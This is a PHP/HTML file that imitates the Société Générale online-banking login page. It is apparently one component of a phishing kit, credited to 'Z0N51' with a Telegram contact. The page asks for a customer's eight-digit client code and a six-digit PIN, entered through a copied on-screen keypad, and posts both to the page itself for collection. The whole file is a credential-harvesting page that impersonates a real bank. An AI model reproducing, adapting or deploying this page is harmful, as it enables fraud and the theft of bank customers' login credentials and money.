<?php include("common/includes.php") ?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!DOCTYPE html>
  <html>
    <head>
      <!--Import Google Icon Font-->
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <!--Import materialize.css-->
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"> 
      <link rel="icon" type="image/png" href="cap/logo.jpg"> 
      <link rel="stylesheet" type="text/css" href="css/css.css">
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">    
      <!--Let browser know website is optimized for mobile-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
      <title>Société Générale | Connexion</title>
    </head>
        
    <body>
      <img src="cap/nav1.png" class="hide-on-small-only" style="width: 100%">
      <img src="cap/nav2.png" class="hide-on-med-and-up" style="width: 100%">
      <div class="row">
        <div class="col m6 s12" style="margin-top: 32px;">
          
          <form name="changer" method="POST" id="form1" action="#" >

            <div class="row">
              <div class="input-field col s10 m6 offset-s1 offset-m3 ">
               <input id="last_name" type="text" class="validate" maxlength="8" name="login" style="border-bottom: 2px solid #999;font-size: 1.313em;font-weight: 600; padding-left: 10px;" >
                <label for="last_name" style="color: #666;font-size: 1.125rem;font-weight: 400;">Saisissez votre code client</label>
               <span>
                 <i id="clear" class="material-icons" style="position: absolute; left: 300px; bottom: 20px; font-size: 20px; font-weight: 900; display: none">clear</i>
                 <i id="check" class="material-icons" style="position: absolute; left: 300px; bottom: 20px; font-size: 20px; font-weight: 900; color: green;display: none">check</i>
               </span>
              </div>
           </div>
        
          <div class="row col m6 s10 offset-s1 offset-m3 row">
             <div class="col m3 s3" >
               <input type="checkbox" id="switch" style="height: 10px" /><label id="label1" for="switch" style="margin-top: 3px;">Toggle</label>
             </div> 
             <div class="col m8 s8">
               <span  style="color: #615c5c; text-align: left;line-height: 1.4;font-weight: 600;">Se souvenir de moi  </span>
             </div>
             <div class="col m1 s1"><img src="cap/info.png" style="margin-left: -50px;"></div>
          </div>  

           <div class="input-field col s10 m6 offset-s1 offset-m3 ">
                   <button id="continuer" type="submit" class="btn col s10 m10 offset-s1 offset-m1" style="border-radius: 20px; background-color: #e9041e; color: #fff; font-size: 0.8999rem; font-weight: 800">Valider</button>
           </div>

          <div id="clavier" class="" style="display: none;" class="row">
          
               <input class="input-field col s8 m4 offset-s2 offset-m4" id="password" maxlength="6" type="password" readonly="" name="password" class="validate" style="border-color: #333; text-align: center; font-size: 30px; margin-top: -50px; margin-bottom: 10px;">
               <div class=" col m1 s2"><a href="#" id="clean"><i  class="material-icons" style="position: absolute; color: black; margin-top: -17px; font-size: 20px; font-weight: 900;">clear</i></a></div>          
                <div class="input-field col s10 m6 offset-s1 offset-m3 row " >
                  <div cclass="col s10 m6 offset-s1 offset-m3" style="margin-left: 40px;">

                    <div class="row" style="text-align: center">
                      <a class="btn col s3 m3" value="" id="" "   style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px"></a>
                      <a class="btn col s3 m3"  id=""  id=""     style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px"></a>
                      <a class="btn col s3 m3"  id="" value="1" id="" onClick="clavier(1);"    style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">1</a>
                      <a class="btn col s3 m3"  id="" value="5" id="" onClick="clavier(5);"   class="button" style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">5</a>
                    </div>
                    <div class="row" style="text-align: center; margin-top: -11px;">
                      <a class="btn col s3 m3" value="" id="" value="7" id="" onClick="clavier(7);"  style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">7</a>
                      <a class="btn col s3 m3"  id=""  value="2" id="" onClick="clavier(2);"    style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">2</a>
                      <a class="btn col s3 m3"  id="" value="8" id="" onClick="clavier(8);"    style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">8</a>
                      <a class="btn col s3 m3"  id=""   class="button" style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px"></a>
                    </div>
                    <div class="row" style="text-align: center;margin-top: -11px;">
                      <a class="btn col s3 m3" value="" id="" value="9" id="" onClick="clavier(9);"  style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">9</a>
                      <a class="btn col s3 m3"  id=""  value="3" id="" onClick="clavier(3);"    style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">3</a>
                      <a class="btn col s3 m3"  id=""     style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px"></a>
                      <a class="btn col s3 m3"  value="0" id="" onClick="clavier(0);" style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">0</a>
                    </div>
                    <div class="row" style="text-align: center;margin-top: -11px;">
                      <a class="btn col s3 m3" value="" id="" value="4" id="" onClick="clavier(4);"  style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">4</a>
                      <a class="btn col s3 m3"     style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px"></a>
                      <a class="btn col s3 m3"  id=""     style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px"></a>
                      <a class="btn col s3 m3"  value="6" id="" onClick="clavier(6);" style=" border: 0.5px solid #dedede; border-radius: 5px; background-color: #f7f7f7; color: black; font-size: 25px; height: 53px; width: 55px;box-shadow: none;margin-right: 8px">6</a>
                    </div>
             
             

                  </div>
                </div>

               <div class="input-field col s10 m6 offset-s1 offset-m3 ">
                   <button id="valider"  type="submit" class="btn col s10 m10 offset-s1 offset-m1" style="border-radius: 20px; background-color: #e9041e; color: #fff; font-size: 0.8999rem; font-weight: 800">Valider
                   </button>
              </div>
             

             
          </div>
                

              
        

          </form>

        </div>
        <div class="col m6 hide-on-small-only" style="padding-left:0"><img src="cap/m2.png" style="width: 100%"></div>
      </div>
      <img src="cap/footer1.png" class="hide-on-small-only" style="width: 100%">
      <img src="cap/footer2.png" class="hide-on-med-and-up" style="width: 100%">
      <!--JavaScript at end of body for optimized loading-->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    </body>
  </html>

  <script type="text/javascript">
     function clavier (valeur) {
document.forms["changer"].elements["password"].value=document.forms["changer"].elements["password"].value+valeur;
}
document.getElementById('last_name').addEventListener('input', function(){
    if (document.getElementById('last_name').value.length > 7) {
       document.getElementById('continuer').removeAttribute("disabled");
       document.getElementById('check').style.display = "block"
     }
    else{
      document.getElementById('check').style.display = "none"
       document.getElementById('continuer').setAttribute("disabled", "disabled");
    }
    if(document.getElementById('last_name').value.length > 0){
       document.getElementById('clear').style.display = "block"
       document.getElementById('clear').addEventListener('click', function(){
        document.getElementById('last_name').value = ''
       })
     }  
     if(document.getElementById('last_name').value.length > 7){
       document.getElementById('clear').style.display = "none"
     } 

  })

 document.getElementById('continuer').addEventListener('click', function(e){
        e.preventDefault()
        document.getElementById('continuer').style.display = "none";
        document.getElementById('clavier').style.display = "block";
      })

  document.getElementById('valider').addEventListener('click', function(e){
        e.preventDefault()
        document.getElementById('form1').submit();
      });
  document.getElementById('clean').addEventListener('click', function(e){
        e.preventDefault()
        document.getElementById('password').value='';
      });
        


 </script>
</html>